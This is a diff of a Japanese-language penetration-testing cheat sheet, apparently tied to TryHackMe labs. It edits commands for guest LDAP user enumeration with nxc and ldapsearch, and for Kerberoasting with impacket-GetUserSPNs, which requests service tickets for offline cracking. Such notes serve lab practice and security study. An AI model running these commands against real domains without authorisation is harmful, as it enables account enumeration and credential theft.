@@ -72,12 +72,13 @@ guestで LDAP に接続してユーザー列挙
 	- 使用例 : [[TryHackMe/Machine/Ledger#nxc\|Ledger#nxc]]
 ```sh
 nxc ldap <Domain> -u 'guest' -p '' --users
+nxc ldap <Domain> -u 'guest' -p '' --users
 ```
 
 ### ldapsearch
 LDAPサーバーに接続し、指定した条件でユーザー情報などを検索・列挙（匿名バインドも可能）
 ```shell
-ldapsearch -h <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+ldapsearch -H <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
 ```
 *(DC=DOMAIN,DC=LOCAL は対象ドメインの識別名に置き換え)*
 
@@ -557,7 +558,7 @@ setspn.exe -Q */*
 
 - GetUserSPNs.py
 ```shell
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
+impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
 ```
 - Rubeus (Windows)
 ```powershell
